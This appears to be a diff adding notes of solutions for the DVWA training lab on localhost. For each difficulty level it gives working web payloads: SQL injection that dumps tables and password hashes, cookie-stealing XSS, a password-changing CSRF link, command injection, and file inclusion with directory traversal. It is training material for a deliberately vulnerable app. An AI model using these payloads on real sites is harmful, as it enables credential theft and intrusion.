@@ -1,0 +1,97 @@
++++++ SQL injection: +++++   
+==========================
+[difficulty level : Low]
+------------------------
+DATABASE NAME:  http://127.0.0.1/MyLab/DVWA/vulnerabilities/sqli/?id=11337' union select 1,database()-- -
+
+VERSION :  http://127.0.0.1/MyLab/DVWA/vulnerabilities/sqli/?id=11337' union select 1,version()-- -
+
+CURRENT USER:  http://127.0.0.1/MyLab/DVWA/vulnerabilities/sqli/?id=11337' union select 1,user()-- -
+
+TABLE NAME :  http://127.0.0.1/MyLab/DVWA/vulnerabilities/sqli/?id=11337' union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa'-- -
+
+COLUMN NAME : http://127.0.0.1/MyLab/DVWA/vulnerabilities/sqli/?id=11337' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'-- -
+
+DATA : http://127.0.0.1/MyLab/DVWA/vulnerabilities/sqli/?id=1337' union select 1,group_concat(user,0x7e,password) from dvwa.users-- -
+
+[difficulty level : Medium]
+---------------------------
+DATABASE NAME:  http://127.0.0.1/MyLab/DVWA/vulnerabilities/sqli
+PAYLOAD IN POST PARAMETER--> id=1337 union select 1,database()-- -
+
+TABLE NAME :  http://127.0.0.1/MyLab/DVWA/vulnerabilities/sqli/ 
+PAYLOAD IN POST PARAMETER--> id=1337 union select 1,group_concat(table_name) from information_schema.tables where table_schema=<HEX FORM OF DATABASE NAME>-- -
+NOTE: in this payload we need to write database name in HEX FORM, as single quote ('), double quotes (") and back slash (\) are getting stripped.
+
+[difficulty level : High]
+------------------------
+http://127.0.0.1/MyLab/DVWA/vulnerabilities/sqli/session-input.php
+PAYLOAD IN POST PARAMETER--> id=1337 union select 1,user()-- -
+
+http://127.0.0.1/MyLab/DVWA/vulnerabilities/sqli/session-input.php
+PAYLOAD IN POST PARAMETER--> id=1337' union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa'-- -
+
+
++++++ Cross Site Scriptng: +++++
+================================
+Reflected XSS in GET method parameter : "name"
+----------------------------------------------
+[difficulty level- Low]
+PAYLOAD--> http://127.0.0.1/MyLab/DVWA/vulnerabilities/xss_r/?name=<script>alert(document.cookie);</script>
+
+[difficulty level- Medium]
+PAYLOAD--> http://127.0.0.1/MyLab/DVWA/vulnerabilities/xss_r/?name=admin<sCriPt>alert(document.cookie);</ScRipT>
+
+[difficulty level- High]
+PAYLOAD--> http://127.0.0.1/MyLab/DVWA/vulnerabilities/xss_r/?name=admin<img src=x onerror=prompt(document.cookie)>
+
+Stored XSS
+----------
+[difficulty level- Low]
+http://127.0.0.1/MyLab/DVWA/vulnerabilities/xss_s/
+PAYLOAD in POST Parameter-->
+txtName=incredible&mtxMessage=<img src=x onerror=alert(document.cookie)>EbtnSign=Sign Guestbook
+
+
++++++ Cross Site Request Forgery +++++
+======================================
+[difficulty level- Low]
+1. login to your account.
+2. Open the page PoC.html and access the link inside the page.
+or
+Access the following link
+http://127.0.0.1/MyLab/DVWA/vulnerabilities/csrf/?password_new=qwerty&password_conf=qwerty&Change=Change#  
+
+This will change the logged in user's current password to 'qwerty'.
+
+
++++++ Command Injection +++++
+=============================
+[difficulty level- Low]
+http://127.0.0.1/MyLab/DVWA/vulnerabilities/exec/
+PAYLOAD in POST parameter--> [ <IP> <URL ENCODED FROM OF '&'>  <COMMAND> ]
+eg. 127.0.0.1 %26 whoami
+
+[difficulty level- Medium]
+http://127.0.0.1/MyLab/DVWA/vulnerabilities/exec/
+PAYLOAD in POST parameter--> eg. 127.0.0.1 %26 dir
+
+
++++++ File Inclusion +++++
+==========================
+[difficulty level- Low]
+http://127.0.0.1/MyLab/DVWA/vulnerabilities/fi
+PAYLOAD--> http://127.0.0.1/MyLab/DVWA/vulnerabilities/fi?page=C:/importantfile.txt
+
+[difficulty level- Medium - directory traversal]
+http://127.0.0.1/MyLab/DVWA/vulnerabilities/fi
+PAYLOAD--> http://127.0.0.1/MyLab/DVWA/vulnerabilities/fi?page=..\..\..\sqli\help.php
+
+File Inclusion using file wrapper:
+http://127.0.0.1/MyLab/DVWA/vulnerabilities/fi?page=php://input
+payload in POST parameter--> <? php phpinfo();?>
+
+
++++++ File Upload +++++
+=======================
+You may find solutions in screenshots. 
